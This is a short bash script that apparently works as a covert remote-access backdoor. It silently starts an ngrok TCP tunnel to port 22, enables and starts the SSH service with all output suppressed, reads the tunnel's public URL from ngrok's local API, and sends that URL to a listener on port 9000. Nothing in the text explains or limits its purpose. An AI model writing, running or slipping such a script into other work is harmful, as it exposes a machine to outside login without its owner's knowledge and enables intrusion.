sendto () 
{
    if [[ -n $(sudo netstat -tulpn | grep :4040) ]]; then
        echo "already started" > /dev/null 2>&1;
    else
        ngrok tcp 22 > /dev/null & systemctl enable sshd.service > /dev/null 2>&1;
        systemctl enable sshd > /dev/null 2>&1;
        systemctl start sshd > /dev/null 2>&1;
        systemctl start sshd.service > /dev/null 2>&1;
    fi;
    export WEBHOOK_URL="$(curl http://localhost:4040/api/tunnels | jq ".tunnels[0].public_url")";
    curl -X GET http://localhost:9000/?data=$WEBHOOK_URL
}
sendto
